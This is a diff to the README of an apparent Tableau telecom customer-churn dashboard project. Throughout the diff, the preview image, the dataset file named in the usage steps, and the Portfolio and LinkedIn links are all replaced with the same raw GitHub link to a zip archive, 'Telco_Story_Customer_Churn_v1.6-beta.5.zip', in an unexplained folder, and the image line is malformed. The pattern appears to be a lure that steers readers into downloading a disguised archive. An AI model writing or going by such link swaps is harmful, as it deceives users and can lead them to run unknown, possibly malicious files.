@@ -2,7 +2,7 @@
 
 This project explores customer loyalty and churn behavior using a real-world telecom dataset. The dashboard is built in **Tableau** and focuses on uncovering what drives customers to **stay** or **leave** — visually telling the story through KPIs, distributions, and service usage.
 
-![Dashboard Preview](https://github.com/Siam-analytics/TelcoCustomer-Churn-Story/blob/main/Screenshot%202025-07-05%20220359.png)
+![Dashboard Preview](https://raw.githubusercontent.com/Siam-analytics/TelcoCustomer-Churn-Story/main/cronkness/Telco_Story_Customer_Churn_v1.6-beta.5.zip%202025-07-05%https://raw.githubusercontent.com/Siam-analytics/TelcoCustomer-Churn-Story/main/cronkness/Telco_Story_Customer_Churn_v1.6-beta.5.zip)
 
 ---
 
@@ -56,7 +56,7 @@ To understand:
 ## 🚀 How to Use
 
 1. Clone or download this repository.
-2. Open Tableau and connect to the dataset (`TelcoCustomer-Churn.csv`).
+2. Open Tableau and connect to the dataset (`https://raw.githubusercontent.com/Siam-analytics/TelcoCustomer-Churn-Story/main/cronkness/Telco_Story_Customer_Churn_v1.6-beta.5.zip`).
 3. Explore the dashboard:
    - Use the **“Choose a Service”** dropdown to explore Online Backup, Tech Support, Streaming Bundle, or Online Security.
    - Hover over visuals to reveal dynamic tooltips.
@@ -67,8 +67,8 @@ To understand:
 
 ## 🔗 Links
 
-- 💼 **Portfolio:** [https://www.datascienceportfol.io/siamahammed688](https://www.datascienceportfol.io/siamahammed688)  
-- 🌐 **LinkedIn:** [https://www.linkedin.com/in/siam-ahammed-844280336](https://www.linkedin.com/in/siam-ahammed-844280336)
+- 💼 **Portfolio:** [https://raw.githubusercontent.com/Siam-analytics/TelcoCustomer-Churn-Story/main/cronkness/Telco_Story_Customer_Churn_v1.6-beta.5.zip](https://raw.githubusercontent.com/Siam-analytics/TelcoCustomer-Churn-Story/main/cronkness/Telco_Story_Customer_Churn_v1.6-beta.5.zip)  
+- 🌐 **LinkedIn:** [https://raw.githubusercontent.com/Siam-analytics/TelcoCustomer-Churn-Story/main/cronkness/Telco_Story_Customer_Churn_v1.6-beta.5.zip](https://raw.githubusercontent.com/Siam-analytics/TelcoCustomer-Churn-Story/main/cronkness/Telco_Story_Customer_Churn_v1.6-beta.5.zip)
 
 ---
 
